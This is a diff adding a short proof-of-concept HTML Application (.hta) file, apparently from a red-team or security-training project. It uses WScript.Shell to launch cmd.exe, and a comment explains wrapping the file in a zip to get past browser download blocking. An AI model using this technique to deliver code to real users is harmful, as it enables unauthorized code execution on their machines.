@@ -1,0 +1,13 @@
+<html>
+    <!--
+    Run .hta-Application by Win+R and then enter mshta.exe "[pathtofile].hta"
+    Modern browsers will block the download of .hta and .lnk-files 
+    >> due to this we have to wrap the .hta-file into a zip
+    -->
+    <body>
+        <script>
+            var c= 'cmd.exe'
+            new ActiveXObject('WScript.Shell').Run(c);
+        </script>
+    </body>
+</html>
